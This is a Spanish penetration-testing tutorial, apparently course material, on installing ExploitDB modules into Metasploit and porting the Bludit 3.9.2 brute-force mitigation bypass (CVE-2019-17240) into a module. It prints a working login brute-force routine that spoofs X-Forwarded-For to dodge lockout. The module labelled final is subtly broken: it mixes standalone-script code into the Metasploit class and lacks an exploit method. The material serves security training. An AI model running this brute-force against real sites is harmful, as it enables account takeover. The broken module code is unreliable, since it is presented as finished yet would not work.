Para instalar cualquier nuevo módulo de Metasploit que ya haya sido portado por otros usuarios, se puede optar por actualizar su `msfconsole` desde la terminal, lo que garantizará que todos los últimos exploits, auxiliares y características se instalen en la última versión de `msfconsole`. Siempre que los módulos portados hayan sido integrados en la rama principal del Metasploit-framework en GitHub, deberíamos estar actualizados con los módulos más recientes.

Sin embargo, si solo necesitamos un módulo específico y no queremos realizar una actualización completa, podemos descargar ese módulo e instalarlo manualmente. Nos centraremos en buscar en ExploitDB módulos de Metasploit disponibles, que podemos importar directamente a nuestra versión de `msfconsole` localmente.

[ExploitDB](https://www.exploit-db.com/) es una gran opción cuando buscamos un exploit personalizado. Podemos usar etiquetas para buscar entre los diferentes escenarios de explotación para cada script disponible. Una de estas etiquetas es [Metasploit Framework (MSF)](https://www.exploit-db.com/?tag=3), que, si se selecciona, mostrará solo los scripts que también están disponibles en formato de módulo de Metasploit. Estos se pueden descargar directamente de ExploitDB e instalar en nuestro directorio local de Metasploit Framework, desde donde se pueden buscar y llamar desde dentro de `msfconsole`.

---

## MSF - Search for Exploits

```r
msf6 > search nagios

Matching Modules
================

   #  Name                                                          Disclosure Date  Rank       Check  Description
   -  ----                                                          ---------------  ----       -----  -----------
   0  exploit/linux/http/nagios_xi_authenticated_rce                2019-07-29       excellent  Yes    Nagios XI Authenticated Remote Command Execution
   1  exploit/linux/http/nagios_xi_chained_rce                      2016-03-06       excellent  Yes    Nagios XI Chained Remote Code Execution
   2  exploit/linux/http/nagios_xi_chained_rce_2_electric_boogaloo  2018-04-17       manual     Yes    Nagios XI Chained Remote Code Execution
   3  exploit/linux/http/nagios_xi_magpie_debug                     2018-11-14       excellent  Yes    Nagios XI Magpie_debug.php Root Remote Code Execution
   4  exploit/linux/misc/nagios_nrpe_arguments                      2013-02-21       excellent  Yes    Nagios Remote Plugin Executor Arbitrary Command Execution
   5  exploit/unix/webapp/nagios3_history_cgi                       2012-12-09       great      Yes    Nagios3 history.cgi Host Command Execution
   6  exploit/unix/webapp/nagios_graph_explorer                     2012-11-30       excellent  Yes    Nagios XI Network Monitor Graph Explorer Component Command Injection
   7  post/linux/gather/enum_nagios_xi                              2018-04-17       normal     No     Nagios XI Enumeration
```

Podemos encontrar el código del exploit [dentro de las entradas de ExploitDB](https://www.exploit-db.com/exploits/9861). Alternativamente, si no queremos usar nuestro navegador web para buscar un exploit específico dentro de ExploitDB, podemos usar la versión CLI, `searchsploit`.

```r
searchsploit nagios3

--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                               |  Path
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nagios3 - 'history.cgi' Host Command Execution (Metasploit)                                                                                  | linux/remote/24159.rb
Nagios3 - 'history.cgi' Remote Command Execution                                                                                             | multiple/remote/24084.py
Nagios3 - 'statuswml.cgi' 'Ping' Command Execution (Metasploit)                                                                              | cgi/webapps/16908.rb
Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)                                                                                     | unix/webapps/9861.rb
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Tenga en cuenta que las terminaciones de archivo que terminan en `.rb` son scripts Ruby que probablemente han sido creados específicamente para su uso dentro de `msfconsole`. También podemos filtrar solo por terminaciones de archivo `.rb` para evitar la salida de scripts que no pueden ejecutarse dentro de `msfconsole`. Tenga en cuenta que no todos los archivos `.rb` se convierten automáticamente en módulos de `msfconsole`. Algunos exploits están escritos en Ruby sin tener ningún código compatible con el módulo de Metasploit. Veremos uno de estos ejemplos en la siguiente sub-sección.

```r
searchsploit -t Nagios3 --exclude=".py"

--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                               |  Path
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nagios3 - 'history.cgi' Host Command Execution (Metasploit)                                                                                  | linux/remote/24159.rb
Nagios3 - 'statuswml.cgi' 'Ping' Command Execution (Metasploit)                                                                              | cgi/webapps/16908.rb
Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)                                                                                     | unix/webapps/9861.rb
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Tenemos que descargar el archivo `.rb` y colocarlo en el directorio correcto. El directorio predeterminado donde se almacenan todos los módulos, scripts, plugins y archivos propietarios de `msfconsole` es `/usr/share/metasploit-framework`. Las carpetas críticas también están vinculadas simbólicamente en nuestras carpetas de inicio y root en la ubicación oculta `~/.msf4/`.

### MSF - Directory Structure

```r
ls /usr/share/metasploit-framework/

app     db             Gemfile.lock                  modules     msfdb            msfrpcd    msf-ws.ru  ruby             script-recon  vendor
config  documentation  lib                           msfconsole  msf-json-rpc.ru  msfupdate  plugins    script-exploit   scripts
data    Gemfile        metasploit-framework.gemspec  msfd        msfrpc           msfvenom   Rakefile   script-password  tools
```

```r
ls .msf4/

history  local  logos  logs  loot  modules  plugins  store
```

Lo copiamos en el directorio apropiado después de descargar el [exploit](https://www.exploit-db.com/exploits/9861). Tenga en cuenta que nuestra carpeta de inicio `.msf4` puede no tener toda la estructura de carpetas que podría tener la de `/usr/share/metasploit-framework/`. Entonces, solo necesitaremos `mkdir` las carpetas apropiadas para que la estructura sea la misma que la carpeta original para que `msfconsole` pueda encontrar los nuevos módulos. Después de eso, procederemos a copiar el script `.rb` directamente en la ubicación principal.

Tenga en cuenta que hay ciertas convenciones de nombres que, si no se respetan adecuadamente, generarán errores al intentar que `msfconsole` reconozca el nuevo módulo que instalamos. Use siempre snake-case, caracteres alfanuméricos y guiones bajos en lugar de guiones.

Por ejemplo:

- `nagios3_command_injection.rb`
- `our_module_here.rb`

### MSF - Loading Additional Modules at Runtime

```r
cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
msfconsole -m /usr/share/metasploit-framework/modules/
```

### MSF - Loading Additional Modules

```r
msf6> loadpath /usr/share/metasploit-framework/modules/
```

Alternativamente, también podemos iniciar `msfconsole` y ejecutar el comando `reload_all` para que el módulo recién instalado aparezca en la lista. Después de ejecutar el comando y no se informen errores, intente con la función `search [name]` dentro de `msfconsole` o directamente con `use [module-path]` para saltar directamente al módulo recién instalado.

```r
msf6 > reload_all
msf6 > use exploit/unix/webapp/nagios3_command_injection 
msf6 exploit(unix/webapp/nagios3_command_injection) > show options

Module options (exploit/unix/webapp/nagios3_command_injection):

   Name     Current Setting                 Required  Description
   ----     ---------------                 --------  -----------
   PASS     guest                           yes       The password to authenticate with
   Proxies                                  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80                              yes       The target port (TCP)
   SSL      false                           no        Negotiate SSL/TLS for outgoing connections
   URI      /nagios3/cgi-bin/statuswml.cgi  yes       The full URI path to statuswml.cgi
   USER     guest                           yes       The username to authenticate with
   VHOST                                    no        HTTP server virtual host
```

Ahora estamos listos para lanzarlo contra nuestro objetivo.

---

## Porting Over Scripts into Metasploit Modules

Para adaptar un script de exploit personalizado en Python, PHP o cualquier otro tipo a un módulo Ruby para Metasploit, necesitaremos aprender el lenguaje de programación Ruby. Tenga en cuenta que los módulos Ruby para Metasploit siempre se escriben usando tabs duros.

Al comenzar con un proyecto de portado, no necesitamos comenzar a codificar desde cero. En su lugar

, podemos tomar uno de los módulos de exploit existentes de la categoría en la que encaja nuestro proyecto y reutilizarlo para nuestro script de portado actual. Tenga en cuenta siempre mantener nuestros módulos personalizados organizados para que nosotros y otros pentesters podamos beneficiarnos de un entorno limpio y organizado al buscar módulos personalizados.

Comenzamos eligiendo un código de exploit para portar a Metasploit. En este ejemplo, optaremos por [Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass](https://www.exploit-db.com/exploits/48746). Necesitaremos descargar el script, `48746.rb` y proceder a copiarlo en la carpeta `/usr/share/metasploit-framework/modules/exploits/linux/http/`. Si iniciamos `msfconsole` ahora, solo podremos encontrar un solo exploit de `Bludit CMS` en la misma carpeta que la anterior, confirmando que nuestro exploit aún no ha sido portado. Es una buena noticia que ya haya un exploit de Bludit en esa carpeta porque lo utilizaremos como código base para nuestro nuevo exploit.

### Porting MSF Modules

```r
ls /usr/share/metasploit-framework/modules/exploits/linux/http/ | grep bludit

bludit_upload_images_exec.rb
```

```r
cp ~/Downloads/48746.rb /usr/share/metasploit-framework/modules/exploits/linux/http/bludit_auth_bruteforce_mitigation_bypass.rb
```

Al principio del archivo que copiamos, que es donde llenaremos nuestra información, podemos notar las declaraciones `include` al principio del módulo base. Estos son los mixins mencionados en la sección `Plugins and Mixins`, y necesitaremos cambiarlos a los apropiados para nuestro módulo.

Si queremos encontrar los mixins, clases y métodos apropiados necesarios para que nuestro módulo funcione, necesitaremos buscar las diferentes entradas en la [documentación de rubydoc rapid7](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf).

---

## Writing Our Module

A menudo nos enfrentaremos a una red personalizada que ejecuta código propietario para servir a sus clientes durante evaluaciones específicas. La mayoría de los módulos que tenemos a mano no hacen ni una mella en su perímetro, y no podemos escanear y documentar correctamente el objetivo con nada de lo que tenemos. Aquí es donde puede resultar útil desempolvar nuestras habilidades de Ruby y comenzar a codificar nuestros módulos.

Toda la información necesaria sobre la codificación de Ruby en Metasploit se puede encontrar en la [página relacionada de Rubydoc.info Metasploit Framework](https://www.rubydoc.info/github/rapid7/metasploit-framework). Desde escáneres hasta otras herramientas auxiliares, desde exploits hechos a medida hasta portados, la codificación en Ruby para el Framework es una habilidad increíblemente aplicable.

Por favor, mire a continuación un módulo similar que podemos usar como código base para nuestro exploit portado. Este es el exploit [Bludit Directory Traversal Image File Upload Vulnerability](https://www.exploit-db.com/exploits/47699), que ya se ha importado en `msfconsole`. Tómese un momento para reconocer todos los diferentes campos incluidos en el módulo antes del proof-of-concept (`POC`) del exploit. Tenga en cuenta que este código no se ha cambiado en el fragmento a continuación para que se ajuste a nuestra importación actual, sino que es una instantánea directa del módulo preexistente mencionado anteriormente. La información deberá ajustarse adecuadamente para el nuevo proyecto de portado.

### Proof-of-Concept - Requirements

```r
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE
  include Msf::Exploit::FileDropper
  include Msf::Auxiliary::Report
```

Podemos mirar las declaraciones `include` para ver qué hace cada una. Esto se puede hacer cruzándolas con la [documentación de rubydoc rapid7](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf). A continuación se muestran sus respectivas funciones según se explica en la documentación:

|**Función**|**Descripción**|
|---|---|
|`Msf::Exploit::Remote::HttpClient`|Este módulo proporciona métodos para actuar como un cliente HTTP al explotar un servidor HTTP.|
|`Msf::Exploit::PhpEXE`|Este es un método para generar un payload php de primera etapa.|
|`Msf::Exploit::FileDropper`|Este método transfiere archivos y maneja la limpieza de archivos después de establecer una sesión con el objetivo.|
|`Msf::Auxiliary::Report`|Este módulo proporciona métodos para reportar datos a la base de datos MSF.|

Mirando sus propósitos anteriores, concluimos que no necesitaremos el método FileDropper, y podemos eliminarlo del código final del módulo.

Vemos que hay diferentes secciones dedicadas a la página `info` del módulo, la sección `options`. Las llenamos adecuadamente, ofreciendo el crédito debido a las personas que descubrieron el exploit, la información de CVE y otros detalles relevantes.

### Proof-of-Concept - Module Information

```r
  def initialize(info={})
    super(update_info(info,
      'Name'           => "Bludit Directory Traversal Image File Upload Vulnerability",
      'Description'    => %q{
        This module exploits a vulnerability in Bludit. A remote user could abuse the uuid
        parameter in the image upload feature in order to save a malicious payload anywhere
        onto the server, and then use a custom .htaccess file to bypass the file extension
        check to finally get remote code execution.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'christasa', # Original discovery
          'sinn3r'     # Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2019-16113'],
          ['URL', 'https://github.com/bludit/bludit/issues/1081'],
          ['URL', 'https://github.com/bludit/bludit/commit/a9640ff6b5f2c0fa770ad7758daf24fec6fbf3f5#diff-6f5ea518e6fc98fb4c16830bbf9f5dac' ]
        ],
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Notes'          =>
        {
          'SideEffects' => [ IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability'   => [ CRASH_SAFE ]
        },
      'Targets'        =>
        [
          [ 'Bludit v3.9.2', {} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "2019-09-07",
      'DefaultTarget'  => 0))
```

Después de llenar la información general de identificación, podemos pasar a las variables del menú `options`:

### Proof-of-Concept - Functions

```r
 register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for Bludit', '/']),
        OptString.new('BLUDITUSER', [true, 'The username for Bludit']),
        OptString.new('BLUDITPASS', [true, 'The password for Bludit'])
      ])
  end
```

Mirando hacia atrás en nuestro exploit, vemos que se requerirá una lista de contraseñas en lugar de la variable `BLUDITPASS` para que el módulo fuerce las contraseñas para el mismo nombre de usuario. Se vería algo así como el siguiente fragmento:

```r
OptPath.new('PASSWORDS', [ true, 'The list of passwords',
          File.join(Msf::Config.data_directory, "wordlists", "passwords.txt") ])
```

El resto del código del exploit debe ajustarse según las clases, métodos y variables utilizadas en el portado al Metasploit Framework para que el módulo funcione al final. La versión final del módulo se vería así:

### Proof-of-Concept

```r
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE
  include Msf::Auxiliary::Report
  
  def initialize(info={})
    super(update_info(info,
      'Name'           => "Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass",
      'Description'    => %q{
        Versions prior to and including 3.9.2 of the Bludit CMS are vulnerable to a bypass of the anti-brute force mechanism that is in place to block users that have attempted to login incorrectly ten times or more. Within the bl-kernel/security.class.php file, a function named getUserIp attempts to determine the valid IP address of the end-user by trusting the X-Forwarded-For and Client-IP HTTP headers.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'rastating', # Original discovery
          '0ne-nine9'  #

 Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2019-17240'],
          ['URL', 'https://rastating.github.io/bludit-brute-force-mitigation-bypass/'],
          ['PATCH', 'https://github.com/bludit/bludit/pull/1090' ]
        ],
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Notes'          =>
        {
          'SideEffects' => [ IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability'   => [ CRASH_SAFE ]
        },
      'Targets'        =>
        [
          [ 'Bludit v3.9.2', {} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "2019-10-05",
      'DefaultTarget'  => 0))
      
     register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for Bludit', '/']),
        OptString.new('BLUDITUSER', [true, 'The username for Bludit']),
        OptPath.new('PASSWORDS', [ true, 'The list of passwords',
        	File.join(Msf::Config.data_directory, "wordlists", "passwords.txt") ])
      ])
  end
  
  # -- Exploit code -- #
  # dirty workaround to remove this warning:
#   Cookie#domain returns dot-less domain name now. Use Cookie#dot_domain if you need "." at the beginning.
# see https://github.com/nahi/httpclient/issues/252
class WebAgent
  class Cookie < HTTP::Cookie
    def domain
      self.original_domain
    end
  end
end

def get_csrf(client, login_url)
  res = client.get(login_url)
  csrf_token = /input.+?name="tokenCSRF".+?value="(.+?)"/.match(res.body).captures[0]
end

def auth_ok?(res)
  HTTP::Status.redirect?(res.code) &&
    %r{/admin/dashboard}.match?(res.headers['Location'])
end

def bruteforce_auth(client, host, username, wordlist)
  login_url = host + '/admin/login'
  File.foreach(wordlist).with_index do |password, i|
    password = password.chomp
    csrf_token = get_csrf(client, login_url)
    headers = {
      'X-Forwarded-For' => "#{i}-#{password[..4]}",
    }
    data = {
      'tokenCSRF' => csrf_token,
      'username' => username,
      'password' => password,
    }
    puts "[*] Trying password: #{password}"
    auth_res = client.post(login_url, data, headers)
    if auth_ok?(auth_res)
      puts "\n[+] Password found: #{password}"
      break
    end
  end
end

#begin
#  args = Docopt.docopt(doc)
#  pp args if args['--debug']
#
#  clnt = HTTPClient.new
#  bruteforce_auth(clnt, args['--root-url'], args['--user'], args['--#wordlist'])
#rescue Docopt::Exit => e
#  puts e.message
#end
```

Si desea aprender más sobre cómo portar scripts al Metasploit Framework, consulte el libro [Metasploit: A Penetration Tester's Guide de No Starch Press](https://nostarch.com/metasploit). Rapid7 también ha creado publicaciones en blogs sobre este tema, que se pueden encontrar [aquí](https://blog.rapid7.com/2012/07/05/part-1-metasploit-module-development-the-series/).